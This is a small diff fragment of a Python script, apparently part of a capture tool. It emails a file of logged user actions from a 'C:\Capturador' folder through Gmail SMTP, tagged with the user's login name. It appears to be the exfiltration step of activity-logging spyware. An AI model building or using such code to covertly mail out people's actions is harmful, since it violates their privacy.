@@ -16,7 +16,7 @@ def enviar_correo():
     mime_message["Subject"] = "Acciones de " + os.getlogin()
     mime_message.attach(MIMEText(message))
     smtp = SMTP("smtp.gmail.com",587)
-    f="lista_acciones.txt"
+    f="C:\Capturador\lista_acciones.txt"
 
     part = MIMEBase('application', "octet-stream")
     file= open(f, 'rb')
